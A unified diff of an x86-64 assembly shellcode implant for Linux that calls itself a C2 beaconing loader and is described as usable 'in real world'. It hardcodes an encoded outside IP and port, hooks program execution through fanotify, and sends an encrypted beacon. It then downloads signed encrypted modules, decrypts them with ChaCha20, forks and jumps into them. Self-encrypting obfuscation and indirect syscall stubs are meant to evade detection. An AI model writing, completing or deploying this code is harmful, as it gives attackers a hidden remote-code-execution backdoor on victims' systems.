@@ -1,106 +1,78 @@
 ;THIS IS VERSION 0.1 (1 > 0.x V are test versions but can be used in real world)
 [BITS 64]
 
-IP1 equ 127 ;
-IP2 equ 0;
-IP3 equ 0;
-IP4 equ -126 ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime
+IP1 equ 146 ;0xa0000014
+IP2 equ 190;0xe800
+IP3 equ 81;0x6b80000
+IP4 equ -83;0x80000031 ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime
 PORT equ 0x5000
-base_adress equ here - _entry
-
 
 _entry:
-	call here ;input come from rax it is base adress
-here:
-	pop rax
-	sub rax,base_adress
-crate_func_table:
-	mov qword[rel api_table],rax
+;this OBF parts are in memory decrypter and identifer for obufcater sccript
+; ;obufactions =====OBF
+;     call here0
+; here0:
+;     pop r10
+;     add r10,17
+; 	mov r13,60
+; 	call gostEncrypt
+; ;obufactions =====OBF
 
+ 	;fanotify_init(int flags, unsigned int event_f_flags)
+    mov rdi, 0
+    mov rsi, 0
+	mov r15d,0x83a00001 ;mov rax, 300
+	call gostGetSyscall ;
+    call gostEXESyscall
+    mov r14,rax			; save fanotify fd in rbx
 
-unique_id:
-	;========OBUF========
-		lea r10,[rel here0]
-		mov r13,500
-		call gostEncrypt
-	here0:
-	;========OBUF========
-	mov     rax, 63          ; SYS_uname
-    lea     rdi, [rel uts]
-    syscall
-	test rax,rax
-	jnz exit
+fanotify_mark:
+    ; fanotify_mark(fd, FAN_MARK_ADD|FAN_MARK_MOUNT, FAN_EXEC, AT_FDCWD, "/")
+    mov rdi, r14 
+    mov rsi, 0x11
+    mov rdx, 0x00000008
+	mov r15d,0x81dc0001
+	call gostGetSyscall ;mov rax, 301
+	mov r10, -100
+	lea r8, [rel path]
+    call gostEXESyscall
 
-    ; hostname (uts.nodename is at offset 65 in utsname struct)
-    lea     rsi, [uts + 65]  ; pointer to nodename string
-    mov     rcx, 32          ; copy up to 32 chars
-    xor     rbx, rbx
-.hash_hostname:
-    mov     al,sil
-    test    al, al
-    jz      .done_hash
-    ror     rbx, 5
-    xor     bl, al
-    inc     rsi
-    loop    .hash_hostname
-.done_hash:
+; ;obufactions =====OBF
+;     call here1
+; here1:
+;     pop r10
+;     add r10,17
+; 	mov r13,30
+; 	call gostEncrypt
+; ;obufactions =====OBF
 
-    ; === statfs(2) on "/" ===
-    mov     rax, 137         ; SYS_statfs
-    lea     rdi, [rel path]  ; path = "/"
-    lea     rsi, [rel fsinfo]
-    syscall
-	test rax,rax
-	jnz exit
+	cmp rax, 0
+    js exit   ; if negative, syscall failed, This prevent run this on nonerooted user
 
-    ; fsid is at offset 8 in struct statfs (two ints, 8 bytes)
-	lea rax,[rel fsinfo]
-    add rax,8
-    xor rbx,rax         ; mix with hostname hash
+read_loop:
+    ; read(fanotify_fd, buffer, 4096)
+    mov rdi, r14
+    lea rsi, [rel event_buffer]
+    mov rdx, 4096
+	mov r15d,0x0
+	call gostGetSyscall ;mov rax, 0
+    call gostEXESyscall
 
-	mov [rel unID], rbx ;store id
-
-	;=====BACKOBUF=======
-		lea r10,[rel _here0]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here0:
-	;=====BACKOBUF=======
-
-
-dealy:
-	;========OBUF========
-		lea r10,[rel here00]
-		mov r13,500
-		call gostEncrypt
-	here00:
-	;========OBUF========
-
-	lea rdi, [rel timespec]  ; pointer to timespec
-	xor rsi, rsi             ; rem = NULL
-	mov rax, 35              ; syscall number for nanosleep
-	syscall
-	; test rax,rax
-	; jnz exit
-
-	;=====BACKOBUF=======
-		lea r10,[rel _here00]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here00:
-	;=====BACKOBUF=======
-
+    ; if read <=0, just loop
+    cmp rax, 1
+    jl read_loop
 
 ;This is beconing For C2
+beaconing:
 
-	;========OBUF========
-		lea r10,[rel here1]
-		mov r13,500
-		call gostEncrypt
-	here1:
-	;========OBUF========
+; ;obufactions =====OBF
+;     call here2
+; here2:
+;     pop r10
+;     add r10,17
+; 	mov r13,60
+; 	call gostEncrypt
+; ;obufactions =====OBF
 
     ;creating a socket syscall
     mov rdi,2
@@ -109,18 +81,21 @@ dealy:
     mov r15d,0x3d800000
 	call gostGetSyscall ;mov rax,41
     call gostEXESyscall
-	test rax,rax
-	js dealy
-	mov r12,rax ; sockfd is store in r12
+    mov r12,rax ; sockfd is store in r12
 	push r12
-    
-	
     ;create adress structer
-    ;sub rsp,0xbe
-    ;mov r9,rsp ;r9 and rsp is the adress_structer pointer
-	lea r9,[rel modules]
-	;add rsp, 0xbe
+    sub rsp,0xbe
+    mov r9,rsp ;r9 and rsp is the adress_structer pointer
+	add rsp, 0xbe
 
+;obufactions =====OBF
+;     call here3
+; here3:
+;     pop r10
+;     add r10,17
+; 	mov r13,5
+; 	call gostEncrypt
+; ;obufactions =====OBF
 	
 	;mov r15d,IP3
 	;call gostGetSyscall
@@ -151,25 +126,21 @@ dealy:
     mov r15d,0x1f800000
 	call gostGetSyscall ;mov rax,42
     call gostEXESyscall
-	;=====BACKOBUF=======
-		lea r10,[rel _here1]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here1:
-	;=====BACKOBUF=======
-	test rax,rax
-	js dealy
 
 	
-	;========OBUF========
-		lea r10,[rel here2]
-		mov r13,500
-		call gostEncrypt
-	here2:
-	;========OBUF========
 
-    ;send  GET reqest to server syscall
+; ;obufactions =====OBF
+;     push r12
+;     call here4
+; here4:
+;     pop r10
+;     add r10,17
+; 	mov r13,65
+; 	call gostEncrypt
+; ;obufactions =====OBF
+    ; pop r12
+
+    ;send fuck GET reqest to server syscall
     mov rdi,r12
     lea rsi,[rel http_reqest] ;this is not actualy http it is encrypted garbaged http header
     mov rdx,HTTP_LEN
@@ -179,55 +150,52 @@ dealy:
     mov r15d,0x7400000
 	call gostGetSyscall ;mov rax,44
     call gostEXESyscall
-	;=====BACKOBUF=======
-		lea r10,[rel _here2]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here2:
-	;=====BACKOBUF=======
-	test rax,rax
-	js dealy
-
-	;========OBUF========
-		lea r10,[rel here3]
-		mov r13,500
-		call gostEncrypt
-	here3:
-	;========OBUF========
 
     ;damn recive syscall
     mov rdi,r12
     lea rsi,[rel modules];r9
-    mov rdx,1024
+    mov rdx,256
     xor r10,r10
     mov r15d,0x3b80000
 	call gostGetSyscall ;mov rax,45
     call gostEXESyscall
-	;=====BACKOBUF=======
-		lea r10,[rel _here3]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here3:
-	;=====BACKOBUF=======
-	test rax,rax
-	js dealy
     mov r13,rax ;r13 is the read buffer size
+
+; ;obufactions =====OBF
+;     push r13
+;     push r12
+;     call here5
+; here5:
+;     pop r10
+;     add r10,17
+; 	mov r13,30
+; 	call gostEncrypt
+; ;obufactions =====OBF
+;     pop r12
+;     pop r13
 
     ;colse socket connection
     mov rdi,r12
     mov r15d,0xa0000000
 	call gostGetSyscall ;mov rax,3
     call gostEXESyscall
-	test rax,rax
-	js dealy
 
 	;optional
 	;lea rsi,[rel modules];optional
 	;optional
-
 ;check module 
+
+; ;obufactions =====OBF
+;     push r13
+;     call here6
+; here6:
+;     pop r10
+;     add r10,17
+; 	mov r13,50
+; 	call gostEncrypt
+; ;obufactions =====OBF
+;     pop r13
+
 check_module_signatuer:
     cld
     mov r10,rsi
@@ -240,19 +208,45 @@ signatuer_loop: ;Signatuer is that shuld every module have NSLM55IM
     cmp rsi,r10
     jnz signatuer_loop
 
-    jmp dealy
+    ; mov rdi,1
+    ; lea rsi,[rel invalid_module]
+    ; mov rdx,invalid_module_len
+    ; mov rax,1
+    ; syscall
 
+    jmp fanotify_mark
 
 
 decrypt_module:
+; ;obufactions =====OBF
+;     push r13
+;     call here7
+; here7:
+;     pop r10
+;     add r10,17
+; 	mov r13,30
+; 	call gostEncrypt
+; ;obufactions =====OBF
+;     pop r13
+
     add rsi,8 
     mov r10,rsi ;ignore signater and r10 now pointer to module
 
 	sub r13,8 ;length of the module
     call gostEncrypt
 	push r10
+
+
 	
 create_module_child:
+; ;obufactions =====OBF
+;     call here8
+; here8:
+;     pop r10
+;     add r10,17
+; 	mov r13,30
+; 	call gostEncrypt
+; ;obufactions =====OBF
 
     pop rsi ;ignore signater and rsi now pointer to module
 
@@ -260,13 +254,8 @@ create_module_child:
     mov r15d,0x2580
 	call gostGetSyscall ;mov eax, 57
     call gostEXESyscall
-
-	
-	test rax, rax
-	js exit
-    jnz dealy
-
-	lea rax,[rel api_table] ;give api table to module
+    test rax, rax
+    jnz read_loop
 
     jmp rsi; jump in to created child process module /give full control of child to module
 
@@ -276,7 +265,6 @@ exit:
 	call gostGetSyscall ;mov rax, 60         ; sys_exit syscall number
     xor rdi, rdi        ; exit code 0
     call gostEXESyscall             ; exit program
-	
 
 ;==========================================================
 ; most modules are cuttuff(execute --> exit) modules. none_cuttufe(long live) module are mov a it id into spesific locationn and it will send when beconing to prevent get module agin
@@ -285,18 +273,17 @@ times 20 db 0
 
 ;=================SHELLCODE_API============
 gostGetSyscall:
-	push r10
-	push r13
-	;========OBUF========
-		lea r10,[rel here5]
-		mov r13,500
-		call gostEncrypt
-	here5:
-	;========OBUF========
-	pop r13
-	pop r10
-
 	push rdx
+; ;2D8
+; ;obufactions =====OBF
+;     call here9
+; here9:
+;     pop r10
+;     add r10,17
+; 	mov r13,71
+; 	call gostEncrypt
+; ;obufactions =====OBF
+
 	push rsi
 	push r12
 	push r9
@@ -333,47 +320,27 @@ loop:
 	pop r12
 	pop rsi
     push rax
+; ;backword_obufactions =====OBF
+;     call here10
+; here10:
+;     pop r10
+;     sub r10,79
+; 	mov r13,71
+; 	call gostEncrypt
+; ;backword_obufactions =====OBF
     pop rax
 	pop rdx
-
-	push r10
-	push r13
-	;=====BACKOBUF=======
-		lea r10,[rel _here5]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here5:
-	;=====BACKOBUF=======
-	pop r13
-	pop r10
     ret
 
 gostSend:
-	;========OBUF========
-		lea r10,[rel here6]
-		mov r13,500
-		call gostEncrypt
-	here6:
-	;========OBUF========
 	;34B
 	push rbp
 	mov rbp,rsp
 
-	;data comes form rdi,rcx
-	push rcx
-	push rcx
-
-
-	mov rsi, rdi
-	lea rdi, [rel gostSendBuf+10]
-	;mov rcx, rcx
-	rep movsb
-
-	lea r10,[rel gostSendBuf]
-	pop r13 ;mov r13,rcx
-	add r13,10
+	;data comes form rdi
+	mov r10,rdi
 	call gostEncrypt
+	mov r13,r10
 
 	;creating a socket syscall
     mov rdi,2
@@ -382,110 +349,68 @@ gostSend:
     mov r15d,0x3d800000
 	call gostGetSyscall ;mov rax,41
     call gostEXESyscall
-	test rax, rax
-	js exit
-    mov r12,rax ; sockfd is store in r11
+    mov r11,rax ; sockfd is store in r11
 
     ;create adress structer
     mov rbx,rsp
-    ;sub rsp,0xbe
-    ;mov r9,rsp ;r9 is the adress_structer pointer
-	lea r9,[rel event_buffer]
-    ;mov rsp,rbx
+    sub rsp,0xbe
+    mov r9,rsp ;r9 is the adress_structer pointer
+    mov rsp,rbx
 
-    ;mov r15d,IP3
-	;call gostGetSyscall
-	mov byte [r9 + 6], IP3;al
+    mov r15d,IP3
+	call gostGetSyscall
+	mov byte [rsp + 6], al
     mov word [r9], 0x02 
     mov word [r9 + 2], PORT ;this is port
-	;mov r15d,IP1
-	;call gostGetSyscall
-	mov r14w,IP1
-    mov byte [r9 + 4], IP1;al
+	mov r15d,IP1
+	call gostGetSyscall
+	mov r14w,ax
+    mov byte [rsp + 4], al
     xor r10, r10
     mov qword [r9 + 8], r10
-	;mov r15d,IP2
-	;call gostGetSyscall
-	mov byte [r9 + 5], IP2;al
-	;mov r15d,IP4
-	;call gostGetSyscall
-	mov rax,IP4
+	mov r15d,IP2
+	call gostGetSyscall
+	mov byte [rsp + 5], al
+	mov r15d,IP4
+	call gostGetSyscall
 	add ax,r14w
-	mov byte [r9 + 7], al ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime
+	mov byte [rsp + 7], al ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip4 = ip4-ip1 127.0.0.1 shuld be 127.0.0.-126 this dinamicaly clculate at runtime
 
 
     ;connect to socket syscall
-    mov rdi,r12
+    mov rdi,r11
     mov rsi,r9
     mov rdx,16
     mov r15d,0x1f800000
 	call gostGetSyscall ;mov rax,42
     call gostEXESyscall
-	test rax, rax
-	js exit
 
-    ;send POST reqest to server syscall
-    mov rdi,r12
-    lea rsi,[rel gostSendBuf] ;ths is look loking normal garbeg but server handle carfuly this this is actualy not almos like http just encryption garbage send to server then close tcp socket
-    pop rdx;mov rdx,HTTP_LEN
-	add rdx,10
+    ;send fuck POST reqest to server syscall
+    mov rdi,r11
+    mov rsi,r13 ;ths is look loking normal garbeg but server handle carfuly this this is actualy not almos like http just encryption garbage send to server then close tcp socket
+    mov rdx,HTTP_LEN
     xor r10,r10
-	xor r9, r9        ; addrlen = 0
-	xor r8, r8        ; dest_addr = NULL
     mov r15d,0x7400000
 	call gostGetSyscall ;mov rax,44
     call gostEXESyscall
-	test rax, rax
-	js exit
 
     ;colse socket connection
-    mov rdi,r12
+    mov rdi,r11
     mov r15d,0xa0000000
 	call gostGetSyscall ;mov rax,3
     call gostEXESyscall
-	test rax, rax
-	js exit
-	;=====BACKOBUF=======
-		lea r10,[rel _here6]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here6:
-	;=====BACKOBUF=======
-	ret
 
 gostPrint:
 	;input is from rdi
 	call gostSend ;if you think to get output of a eny module also use gostPrint function it is secuer
 
-
 gostEXESyscall:
-	push r13
-	push r10
-	;========OBUF========
-		lea r10,[rel here7]
-		mov r13,500
-		call gostEncrypt
-	here7:
-	;========OBUF========
-	pop r10
-
+	;40C
 	mov r15w,0x0E0F
 	mov [rel stub],r15w
 	sub WORD [rel stub+1],9
 stub:
 	db "00"
-	mov r15w,0x00
-	mov [rel stub],r15w
-
-	;=====BACKOBUF=======
-		lea r10,[rel _here7]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here7:
-	;=====BACKOBUF=======
-	pop r13
 	ret
 
 
@@ -495,15 +420,6 @@ gostEncrypt:
 	;r13 is the length
 	push rbp
 	mov rbp,rsp
-	
-	push rdi
-	push rax
-	push rcx
-	push rdx
-	push r8
-	push r9
-	push r11
-	push r12
 
 	;setup state with key and iv
     lea r8,[rel chacha20_state]
@@ -521,150 +437,16 @@ gostEncrypt:
 	push r10
     call chacha20_encrypt
 	pop r10
-	pop r12
-	pop r11
-	pop r9
-	pop r8
-	pop rdx
-	pop rcx
-	pop rax
-	pop rdi
 	leave
 	ret ;no output same input is the encrypt pointer
-
-
-gostExecute:
-	push r10
-	push r13
-	;========OBUF========
-		lea r10,[rel here8]
-		mov r13,500
-		call gostEncrypt
-	here8:
-	;========OBUF========
-
-	;r10 is the binary with absulute path
-	;r13 is arguments
-	;r14 is the out buffer
-
-	
-	lea rdi, [rel pipefd]   ; pointer to int[2]
-    mov eax, 22             ; syscall: pipe
-    syscall
-	test rax, rax
-	js exit
-
-	;duplicate process to make child process using fork
-    mov r15d,0x2580
-	call gostGetSyscall ;mov eax, 57
-    call gostEXESyscall
-
-	pop r13
-	pop r10
-
-    test rax, rax
-	js exit
-    je execute_child
-
-	; Close write end
-    mov rdi, [rel pipefd+4]
-    mov rax, 3
-    syscall
-	test rax, rax
-	js exit
-
-    ; read from pipefd[0] into buffer
-    mov rdi, [rel pipefd]
-    mov rsi, r14
-    mov rdx, 460
-    xor eax, eax            ; syscall read
-    syscall
-	test rax, rax
-	js exit
-
-	push rax
-    ; Close read end
-    mov rdi, [rel pipefd]
-    mov rax, 3
-    syscall
-	test rax, rax
-	js exit
-	pop rax
-	;=====BACKOBUF=======
-		lea r10,[rel _here8]
-		sub r10,500
-		mov r13,500
-		call gostEncrypt
-	_here8:
-	;=====BACKOBUF=======
-	ret
-
-execute_child:
-	push r10
-	push r13
-	
-	mov rdi, [rel pipefd]
-    mov rax, 3
-    syscall
-	test rax, rax
-	js exit
-
-    ; Step 1: Duplicate write end of pipe (pipefd[1]) to stdout (fd 1)
-    mov rdi,[rel pipefd+4]
-    mov rsi, 1            ; newfd (destination = stdout)
-    mov rax, 33
-    syscall
-	test rax, rax
-	js exit
-
-    ; Close write end: fd[1]
-    mov rdi, [rel pipefd+4]
-    mov rax, 3
-    syscall
-	test rax, rax
-	js exit
-
-    
-    mov rdi, r10               ; Path to 'ls' (rdi)
-    mov rsi, r13          ; Arguments to pass (rsi)
-    xor rdx, rdx                 ; Environment variables (set to NULL)
-    mov rax, 59                  ; syscall number for execve
-    syscall
-	mov rax, 60     ; syscall: exit
-    xor rdi, rdi    ; status = 0
-    syscall
 ;=================SHELLCODE_API============
 
-
 ;=======================DATA==========
-
 singnatuer: db "NSLM55IM",0 ;this is standers signatuer IM mean in memory
-path: db "/", 0 ;this is chacha20 encrypted path value dec at runtime use common linux path or what you want
-LEN_PATH equ $ - path
-
-uts: times 390 db 0 ; struct utsname (enough space)
-fsinfo: times 120 db 0 ; struct statfs (enough space)
-
-http_reqest: db 0xE8, 0xFE, 0xF6, 0x2F, 0xC6, 0xEA, 0x20, 0x4B, 0x52, 0x09, 0xCD, 0xA1, 0x63, 0xF7, 0x94, 0xC8, 0x81
-unID: dq 0
+http_reqest: db 0xe8, 0xfe, 0xf6, 0x2f, 0xc6, 0xea, 0x20, 0x4b, 0x52, 0x09, 0xcd, 0xa9, 0x42, 0x9e, 0x83, 0xe1, 0xd2, 0x61, 0x8b, 0x76, 0x92, 0xaa, 0x74, 0x90, 0x51, 0x25, 0x1b, 0x49, 0x79, 0x31, 0x18, 0x9d, 0x4b
 HTTP_LEN equ $ - http_reqest
-
-gostSendBuf: 
-	db "GET /data="
-	times 520 db 0x00;gostsend
-
-timespec:
-    dq 10          ; tv_sec = 2 seconds
-    dq 000000000  ; tv_nsec = 500,000,000 ns = 0.5 s
-
-api_table:
-	dq 0
-	dq gostEncrypt
-	dq gostExecute
-	dq gostGetSyscall
-	dq gostEXESyscall
-	dq gostPrint
-	dq gostSend
+path: db "/tmp", 0 ;this is chacha20 encrypted path value dec at runtime use common linux path or what you want
+LEN_PATH equ $ - path
 ;=======================DATA==========
 
 ;=================CHACHA20=================
@@ -1188,7 +970,6 @@ chacha20_decrypt:
 	ret
 ;==========================================
 
-
 pipefd: times 8 db 0
 chacha20_key: db 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
 chacha20_nonce: db 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x00
@@ -1196,13 +977,13 @@ chacha20_nonce: db 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x4A, 0x00, 0x00, 0
 chacha20_sigma: db 0x65, 0x78, 0x70, 0x61, 0x6E, 0x64, 0x20, 0x33
 chacha20_tau: db 0x32, 0x2D, 0x62, 0x79, 0x74, 0x65, 0x20, 0x6B
 
-event_buffer: times 12 db 0
-
-modules:
-    times 600 db 0
-
 chacha20_state:
     times 64 db 0
+
+modules:
+    times 512 db 0
+
+event_buffer: times 128 db 0
 
 
 ;modulo base 97E
